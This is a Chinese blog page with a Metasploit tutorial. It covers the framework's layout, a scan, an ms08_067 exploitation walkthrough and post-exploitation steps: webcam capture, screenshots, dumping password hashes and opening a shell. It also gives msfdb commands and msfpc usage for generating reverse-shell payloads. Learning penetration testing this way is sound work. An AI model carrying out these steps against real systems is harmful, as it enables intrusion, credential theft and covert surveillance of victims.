@@ -1,0 +1,1374 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Metasploit, Hexo">
+    <meta name="description" content="Metasploit总览
+
+Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Metasploit | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+    
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>Medias</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/musics">
+          
+          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Musics</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/movies">
+          
+          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Movies</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/books">
+          
+          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Books</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/galleries">
+          
+          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Galleries</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			Medias
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/musics " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Musics</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/movies " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Movies</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/books " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Books</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/galleries " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Galleries</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Metasploit
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-12-17
+                </div>
+                
+                
+
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><hr>
+<blockquote>
+<p>Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。<br>Metasploit的设计初衷是打造成一个攻击工具开发平台，本书稍后将讲解如何开发攻击工具。然而在目前情况下，安全专家以及业余安全爱好者更多地将其当作一种点几下鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。 –百度百科</p>
+</blockquote>
+<p>先来看看他的基础架构：<br><img src="https://puui.qpic.cn/fans_admin/0/3_142409441_1571988370103/0" alt=""><br>呐，这样，从右边看，他有很多用户接口，最常用的就是前面两个，现在先来分别介绍下Console，后续部分主要使用的接口，直接使用msfconsole进入<br><img src="https://puui.qpic.cn/fans_admin/0/3_216703492_1571988428123/0" alt=""></p>
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_265838824_1571988514860/0" alt=""><br>它的目录结构为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── app</span><br><span class="line">│   ├── concerns</span><br><span class="line">│   └── validators</span><br><span class="line">├── config</span><br><span class="line">│   ├── application.rb</span><br><span class="line">│   ├── boot.rb</span><br><span class="line">│   ├── cucumber.yml</span><br><span class="line">│   ├── database.yml                     #数据库配置文件</span><br><span class="line">│   ├── database.yml.example</span><br><span class="line">│   ├── database.yml.travis</span><br><span class="line">│   ├── database.yml.vagrant</span><br><span class="line">│   ├── environment.rb</span><br><span class="line">│   └── environments</span><br><span class="line">├── data                             #含有多种模块</span><br><span class="line">│   ├── cpuinfo</span><br><span class="line">│   ├── eicar.com</span><br><span class="line">│   ├── eicar.txt</span><br><span class="line">│   ├── emailer_config.yaml</span><br><span class="line">│   ├── exploits</span><br><span class="line">│   ├── flash_detector</span><br><span class="line">│   ├── ipwn</span><br><span class="line">│   ├── isight.bundle</span><br><span class="line">│   ├── john.conf</span><br><span class="line">│   ├── js</span><br><span class="line">│   ├── lab</span><br><span class="line">│   ├── logos</span><br><span class="line">│   ├── markdown_doc</span><br><span class="line">│   ├── meterpreter</span><br><span class="line">│   ├── mime.yml</span><br><span class="line">│   ├── msfcrawler</span><br><span class="line">│   ├── msfpescan</span><br><span class="line">│   ├── passivex</span><br><span class="line">│   ├── php</span><br><span class="line">│   ├── post</span><br><span class="line">│   ├── ropdb</span><br><span class="line">│   ├── snmp</span><br><span class="line">│   ├── sounds</span><br><span class="line">│   ├── templates                      #含有多种模板</span><br><span class="line">│   ├── vncdll.x64.dll</span><br><span class="line">│   ├── vncdll.x86.dll</span><br><span class="line">│   ├── webcam</span><br><span class="line">│   ├── wmap</span><br><span class="line">│   └── wordlists                       #含有多种字典</span><br><span class="line">├── db</span><br><span class="line">│   ├── migrate</span><br><span class="line">│   └── schema.rb</span><br><span class="line">├── Gemfile</span><br><span class="line">├── Gemfile.lock</span><br><span class="line">├── lib</span><br><span class="line">│   ├── anemone</span><br><span class="line">│   ├── anemone.rb</span><br><span class="line">│   ├── enumerable.rb</span><br><span class="line">│   ├── metasm</span><br><span class="line">│   ├── metasploit</span><br><span class="line">│   ├── msf</span><br><span class="line">│   ├── msfenv.rb</span><br><span class="line">│   ├── net</span><br><span class="line">│   ├── postgres</span><br><span class="line">│   ├── postgres_msf.rb</span><br><span class="line">│   ├── rabal</span><br><span class="line">│   ├── rapid7</span><br><span class="line">│   ├── rbmysql</span><br><span class="line">│   ├── rbmysql.rb</span><br><span class="line">│   ├── rex</span><br><span class="line">│   ├── rex.rb</span><br><span class="line">│   ├── snmp</span><br><span class="line">│   ├── snmp.rb</span><br><span class="line">│   ├── sqlmap</span><br><span class="line">│   ├── tasks</span><br><span class="line">│   ├── telephony</span><br><span class="line">│   ├── telephony.rb</span><br><span class="line">│   └── windows_console_color_support.rb</span><br><span class="line">├── metasploit-framework.gemspec</span><br><span class="line">├── modules                            #主要模块目录，可以看见6大模块。。。</span><br><span class="line">│   ├── auxiliary</span><br><span class="line">│   ├── encoders</span><br><span class="line">│   ├── exploits</span><br><span class="line">│   ├── nops</span><br><span class="line">│   ├── payloads</span><br><span class="line">│   └── post</span><br><span class="line">├── msfbinscan                           #这里是一些命令，可以单独拿出来使用</span><br><span class="line">├── msfconsole</span><br><span class="line">├── msfd</span><br><span class="line">├── msfdb</span><br><span class="line">├── msfelfscan</span><br><span class="line">├── msfmachscan</span><br><span class="line">├── msfpescan</span><br><span class="line">├── msfrop</span><br><span class="line">├── msfrpc</span><br><span class="line">├── msfrpcd</span><br><span class="line">├── msfupdate</span><br><span class="line">├── msfvenom</span><br><span class="line">├── plugins                            #多种插件，可通过载入插件来连接外部程序，扩充自己功能</span><br><span class="line">│   ├── alias.rb</span><br><span class="line">│   ├── auto_add_route.rb</span><br><span class="line">│   ├── beholder.rb</span><br><span class="line">│   ├── db_credcollect.rb</span><br><span class="line">│   ├── db_tracker.rb</span><br><span class="line">│   ├── event_tester.rb</span><br><span class="line">│   ├── ffautoregen.rb</span><br><span class="line">│   ├── ips_filter.rb</span><br><span class="line">│   ├── lab.rb</span><br><span class="line">│   ├── msfd.rb</span><br><span class="line">│   ├── msgrpc.rb</span><br><span class="line">│   ├── nessus.rb</span><br><span class="line">│   ├── nexpose.rb</span><br><span class="line">│   ├── openvas.rb</span><br><span class="line">│   ├── pcap_log.rb</span><br><span class="line">│   ├── request.rb</span><br><span class="line">│   ├── sample.rb</span><br><span class="line">│   ├── session_tagger.rb</span><br><span class="line">│   ├── socket_logger.rb</span><br><span class="line">│   ├── sounds.rb</span><br><span class="line">│   ├── sqlmap.rb</span><br><span class="line">│   ├── thread.rb</span><br><span class="line">│   ├── token_adduser.rb</span><br><span class="line">│   ├── token_hunter.rb</span><br><span class="line">│   ├── wiki.rb</span><br><span class="line">│   └── wmap.rb</span><br><span class="line">├── Rakefile</span><br><span class="line">├── ruby</span><br><span class="line">├── scripts                    #含有大量脚本，在后渗透测试阶段使用</span><br><span class="line">│   ├── meterpreter</span><br><span class="line">│   ├── ps</span><br><span class="line">│   ├── resource</span><br><span class="line">│   └── shell</span><br><span class="line">├── tools                      #有多种可单独使用的工具</span><br><span class="line">│   ├── context</span><br><span class="line">│   ├── dev</span><br><span class="line">│   ├── exploit</span><br><span class="line">│   ├── memdump</span><br><span class="line">│   ├── modules</span><br><span class="line">│   ├── password</span><br><span class="line">│   └── recon</span><br><span class="line">└── vendor</span><br><span class="line">    └── bundle</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h2><hr>
+<p>这是最基本的使用流程，攻击成功后想干嘛随意。</p>
+<h3 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h3><p>可以使用内置模块，也可以使用其他的扫描程序，这里使用nmap<br><img src="https://puui.qpic.cn/fans_admin/0/3_142409441_1571988615166/0" alt=""><br>-sS是隐秘扫描，-Pn是假设主机存活，直接扫描。结果看到打开的端口和运行的服务。如果需要更多信息可以用-A<br><img src="https://puui.qpic.cn/fans_admin/0/3_265838824_1571988682176/0" alt=""></p>
+<h3 id="使用漏洞利用模块"><a href="#使用漏洞利用模块" class="headerlink" title="使用漏洞利用模块"></a>使用漏洞利用模块</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_1271937727_1571988718667/0" alt=""><br>这里使用了最简单的，权限最高的ms08_067漏洞，为什么用这个？不用管，为了学习后续操作，因为这个最简单呀。</p>
+<h3 id="查看需要设置的参数"><a href="#查看需要设置的参数" class="headerlink" title="查看需要设置的参数"></a>查看需要设置的参数</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_1271937727_1571988754161/0" alt=""><br>这里要填写rhost的参数</p>
+<h3 id="设置参数"><a href="#设置参数" class="headerlink" title="设置参数"></a>设置参数</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_216703492_1571988789336/0" alt=""></p>
+<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571988804549/0" alt=""><br>因为这里用的payload是meterpreter，所以利用成功后就可以得到这个，这时就可以进行很多操作了，具体哪些可以看上一篇meterpreter常用命令，这里就介绍一点</p>
+<h3 id="查看目标的进程"><a href="#查看目标的进程" class="headerlink" title="查看目标的进程"></a>查看目标的进程</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990379537/0" alt=""></p>
+<h3 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990433854/0" alt=""></p>
+<h3 id="使用摄像头"><a href="#使用摄像头" class="headerlink" title="使用摄像头"></a>使用摄像头</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_267840583_1571990453530/0" alt=""><br>先查看有没有摄像头</p>
+<h4 id="拍照"><a href="#拍照" class="headerlink" title="拍照"></a>拍照</h4><p><img src="https://puui.qpic.cn/fans_admin/0/3_1333245325_1571990477306/0" alt=""></p>
+<h4 id="实时监控"><a href="#实时监控" class="headerlink" title="实时监控"></a>实时监控</h4><blockquote>
+<p>会在浏览器中打开播放窗口</p>
+</blockquote>
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_267840583_1571990510356/0" alt=""></p>
+<h3 id="下载系统账户的哈希"><a href="#下载系统账户的哈希" class="headerlink" title="下载系统账户的哈希"></a>下载系统账户的哈希</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990528045/0" alt=""></p>
+<h3 id="打开Windows的shell"><a href="#打开Windows的shell" class="headerlink" title="打开Windows的shell"></a>打开Windows的shell</h3><p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990546499/0" alt=""></p>
+<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><hr>
+<h3 id="msfdb"><a href="#msfdb" class="headerlink" title="msfdb"></a>msfdb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfdb</span><br><span class="line">#用于管理msf数据库的命令</span><br><span class="line"> </span><br><span class="line">  msfdb init    # 初始化数据库，第一次使用msf时使用</span><br><span class="line">  msfdb reinit  # 重新初始化数据库，把数据库弄乱时使用</span><br><span class="line">  msfdb delete  #停止并删除数据库</span><br><span class="line">  msfdb start   #启动数据库</span><br><span class="line">  msfdb stop    # 停止数据库</span><br></pre></td></tr></table></figure>
+
+<h3 id="msfpc"><a href="#msfpc" class="headerlink" title="msfpc"></a>msfpc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfpc</span><br><span class="line">#用来生成payload的</span><br><span class="line"> </span><br><span class="line"> /usr/bin/msfpc &lt;TYPE&gt; (&lt;DOMAIN/IP&gt;) (&lt;PORT&gt;) (&lt;CMD/MSF&gt;) (&lt;BIND/REVERSE&gt;) (&lt;STAGED/STAGELESS&gt;) (&lt;TCP/HTTP/HTTPS/FIND_PORT&gt;) (&lt;BATCH/LOOP&gt;) (&lt;VERBOSE&gt;)</span><br><span class="line">例如: /usr/bin/msfpc windows 192.168.1.10        # Windows &amp; manual IP.</span><br><span class="line">            /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0&apos;s IP &amp; manual port.</span><br><span class="line">            /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.</span><br><span class="line">            /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1&apos;s IP.</span><br><span class="line">            /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.</span><br><span class="line">            /usr/bin/msfpc help verbose                # Help screen, with even more information.</span><br><span class="line"> </span><br><span class="line"> &lt;TYPE&gt;:</span><br><span class="line">   + ASP</span><br><span class="line">   + ASPX</span><br><span class="line">   + Bash [.sh]</span><br><span class="line">   + Java [.jsp]</span><br><span class="line">   + Linux [.elf]</span><br><span class="line">   + OSX [.macho]</span><br><span class="line">   + Perl [.pl]</span><br><span class="line">   + PHP</span><br><span class="line">   + Powershell [.ps1]</span><br><span class="line">   + Python [.py]</span><br><span class="line">   + Tomcat [.war]</span><br><span class="line">  